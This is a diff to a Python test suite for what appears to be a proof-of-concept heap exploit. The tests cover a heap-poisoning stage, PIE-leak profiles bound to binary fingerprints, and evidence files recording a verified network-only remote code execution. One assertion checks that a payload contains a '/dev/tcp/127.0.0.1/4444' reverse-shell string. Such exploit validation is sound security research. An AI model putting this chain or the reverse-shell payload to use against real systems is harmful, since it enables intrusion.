@@ -84,6 +84,33 @@ class PocTests(unittest.TestCase):
         self.assertIn(b"/dev/tcp/127.0.0.1/4444", payload)
         self.assertNotIn(b"host.docker.internal", payload)
 
+    def test_heap_stage_one_preserves_v24_poison_source_with_proof(self):
+        target = 0x555500001000
+        proof = bytes(512)
+        original = HEAP.GENERATOR.malformed_brotli
+        HEAP.GENERATOR.malformed_brotli = lambda prefix, _extra: prefix
+        try:
+            stage = HEAP.stage_one(target, 0xFFBF10, proof)
+        finally:
+            HEAP.GENERATOR.malformed_brotli = original
+        self.assertEqual(
+            stage[0x77:0x87], struct.pack("<QQ", target, target)
+        )
+
+    def test_pie_profile_is_bound_to_exact_binary_fingerprint(self):
+        digest = "93102becef36fbf01564e5af4e3a62cea0f6ee08d331db78a994b36bc7b490b2"
+        profile = PIE_LEAK.PIE_NETWORK_PROFILES[digest]
+        self.assertEqual(profile["version"], "24.22.0")
+        self.assertEqual(profile["record_size"], 0x200)
+        self.assertEqual(profile["ring_from_heap"], 0xE200)
+        self.assertEqual(len(profile["poison_positions"]), 4)
+        self.assertTrue(
+            all(
+                -(1 << 31) <= item < (1 << 31)
+                for item in profile["poison_positions"]
+            )
+        )
+
     def test_heap_layout_selector_covers_verified_binary_fingerprints(self):
         index = SELECTOR.verified_fingerprint_index()
         self.assertEqual(len(index), 84)
@@ -297,7 +324,7 @@ class PocTests(unittest.TestCase):
         self.assertEqual(len(stable), 1)
         self.assertEqual(stable[0]["trials_observed"], 2)
 
-    def test_pie_leak_evidence_separates_feasibility_from_rce(self):
+    def test_pie_network_only_evidence_is_complete_and_gdb_free(self):
         evidence_dir = ROOT / "evidence" / "pie-address-leak"
         summary = json.loads((evidence_dir / "summary.json").read_text(encoding="utf-8"))
         survey = json.loads((evidence_dir / "24.22.0.json").read_text(encoding="utf-8"))
@@ -307,10 +334,14 @@ class PocTests(unittest.TestCase):
         oracle = json.loads(
             (evidence_dir / "oracle-control-24.22.0.json").read_text(encoding="utf-8")
         )
-
-        self.assertEqual(
-            summary["result"], "pie-address-leak-feasible-rce-not-yet-verified"
+        leak_lane = json.loads(
+            (evidence_dir / "leak-lane-survey-24.22.0.json").read_text(encoding="utf-8")
         )
+        calibration = json.loads(
+            (evidence_dir / "heap-calibration-24.22.0.json").read_text(encoding="utf-8")
+        )
+
+        self.assertEqual(summary["result"], "pie-network-only-rce-verified")
         self.assertEqual(survey["binary"]["elf_type"], "ET_DYN")
         self.assertEqual(survey["trial_count"], 100)
         self.assertEqual(survey["distinct_node_load_bias_count"], 100)
@@ -328,18 +359,22 @@ class PocTests(unittest.TestCase):
         )
 
         network = relocated["relocated_chain"]
-        self.assertEqual(network["result"], "rce-not-verified")
+        self.assertEqual(network["result"], "rce-verified")
         self.assertFalse(network["debugger_used"])
         self.assertFalse(network["runtime_address_read_used"])
-        self.assertEqual(len(network["attempts"]), 20)
+        self.assertEqual(network["runtime_controls"]["kernel_randomize_va_space"], 2)
+        self.assertFalse(network["runtime_controls"]["ld_preload_used"])
         self.assertEqual(
-            sum(item["leak_attempts"] is not None for item in network["attempts"]),
-            13,
+            network["heap_layout"]["selection"],
+            "verified-pie-binary-fingerprint",
         )
-        self.assertEqual(
-            sum(item["outcome"] == "rce-proof" for item in network["attempts"]),
-            0,
-        )
+        self.assertEqual(network["attempts"][-1]["outcome"], "rce-proof")
+        self.assertEqual(network["attempts"][-1]["proof_command"], "/usr/bin/id (fixed)")
+        self.assertRegex(network["attempts"][-1]["proof_stdout"], r"^uid=1000")
+        self.assertEqual(leak_lane["stable_candidate"]["trials_observed"], 20)
+        self.assertEqual(leak_lane["trial_count"], 20)
+        self.assertTrue(calibration["debugger_used"])
+        self.assertFalse(calibration["proof_eligible"])
         control = oracle["oracle_relocated_chain"]
         self.assertTrue(control["runtime_address_read_used"])
         self.assertEqual(control["result"], "rce-not-verified")
